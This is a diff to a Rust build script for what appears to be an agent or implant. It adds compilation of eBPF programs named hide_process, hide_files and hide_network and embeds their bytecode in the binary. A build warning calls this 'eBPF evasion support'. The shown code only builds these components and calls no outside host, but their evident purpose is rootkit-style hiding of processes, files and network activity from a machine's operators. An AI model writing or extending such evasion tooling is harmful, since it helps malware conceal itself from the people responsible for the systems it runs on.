@@ -340,4 +340,131 @@ fn main() {
         let hex: String = nonce.iter().map(|b| format!("{:02x}", b)).collect();
         println!("cargo:rustc-env=ORCHESTRA_NONCE={}", hex);
     }
+
+    // ── eBPF program compilation (ebpf feature) ─────────────────────────
+    // When the `ebpf` feature is enabled, compile eBPF C sources to BPF
+    // bytecode using `clang -target bpf`.  If clang is not available, emit
+    // empty placeholder byte arrays and log a warning — the agent will
+    // gracefully degrade at runtime.
+    if std::env::var_os("CARGO_FEATURE_EBPF").is_some() {
+        compile_ebpf_programs();
+    }
+}
+
+/// Compile eBPF C sources (`.bpf.c`) in `ebpf/` to BPF ELF objects (`.o`),
+/// then emit each as a `cargo:rustc-env=EBPF_<NAME>=<hex>` environment
+/// variable so the Rust module can embed the bytecode at compile time.
+///
+/// Requires `clang` on `$PATH`.  If `clang` is not found the build still
+/// succeeds — the embedded byte arrays will be empty and the agent will
+/// skip eBPF loading at runtime (graceful degradation).
+fn compile_ebpf_programs() {
+    let manifest_dir = std::path::PathBuf::from(
+        std::env::var("CARGO_MANIFEST_DIR").expect("CARGO_MANIFEST_DIR set by cargo"),
+    );
+    let ebpf_dir = manifest_dir.join("ebpf");
+
+    // Detect clang — try `clang` first, then versioned names.
+    let clang = which_clang();
+    if clang.is_none() {
+        eprintln!(
+            "warning: clang not found; eBPF programs will not be compiled. \
+             Install clang for eBPF evasion support."
+        );
+        emit_empty_ebpf_env();
+        return;
+    }
+    let clang = clang.unwrap();
+
+    let out_dir = std::path::PathBuf::from(
+        std::env::var("OUT_DIR").expect("OUT_DIR set by cargo"),
+    );
+    let ebpf_out = out_dir.join("ebpf");
+    std::fs::create_dir_all(&ebpf_out)
+        .expect("failed to create eBPF output directory");
+
+    let programs = [
+        "hide_process",
+        "hide_files",
+        "hide_network",
+    ];
+
+    let include_dir = ebpf_dir.clone(); // .bpf.c files are in ebpf/
+
+    for prog_name in &programs {
+        let src = ebpf_dir.join(format!("{}.bpf.c", prog_name));
+        let obj = ebpf_out.join(format!("{}.o", prog_name));
+
+        if !src.exists() {
+            eprintln!(
+                "warning: eBPF source {} not found; skipping",
+                src.display()
+            );
+            emit_empty_ebpf_program(prog_name);
+            continue;
+        }
+
+        println!("cargo:rerun-if-changed={}", src.display());
+
+        // clang -target bpf -O2 -g -c -I <include> -o <obj> <src>
+        let status = std::process::Command::new(&clang)
+            .arg("-target")
+            .arg("bpf")
+            .arg("-O2")
+            .arg("-g")
+            .arg("-c")
+            .arg("-I")
+            .arg(&include_dir)
+            .arg("-o")
+            .arg(&obj)
+            .arg(&src)
+            .status()
+            .expect("failed to execute clang");
+
+        if !status.success() {
+            eprintln!(
+                "warning: clang failed to compile {} ; eBPF program will be empty",
+                src.display()
+            );
+            emit_empty_ebpf_program(prog_name);
+            continue;
+        }
+
+        // Read the compiled object and emit as hex-encoded env var.
+        let bytes = std::fs::read(&obj).unwrap_or_else(|e| {
+            panic!("failed to read compiled eBPF object {}: {e}", obj.display())
+        });
+        let hex: String = bytes.iter().map(|b| format!("{:02x}", b)).collect();
+        let env_name = format!("EBPF_{}", prog_name.to_uppercase());
+        println!("cargo:rustc-env={}={}", env_name, hex);
+    }
+}
+
+/// Try to find a suitable clang binary on PATH.
+fn which_clang() -> Option<String> {
+    let candidates = ["clang", "clang-17", "clang-16", "clang-15", "clang-14"];
+    for candidate in &candidates {
+        if std::process::Command::new(candidate)
+            .arg("--version")
+            .output()
+            .is_ok()
+        {
+            return Some(candidate.to_string());
+        }
+    }
+    None
+}
+
+/// Emit empty byte arrays for all eBPF programs (graceful degradation).
+fn emit_empty_ebpf_env() {
+    let programs = ["hide_process", "hide_files", "hide_network"];
+    for prog_name in &programs {
+        emit_empty_ebpf_program(prog_name);
+    }
+}
+
+/// Emit an empty byte array for a single eBPF program.
+fn emit_empty_ebpf_program(name: &str) {
+    let env_name = format!("EBPF_{}", name.to_uppercase());
+    println!("cargo:rustc-env={}=", env_name); // empty = no bytecode
 }
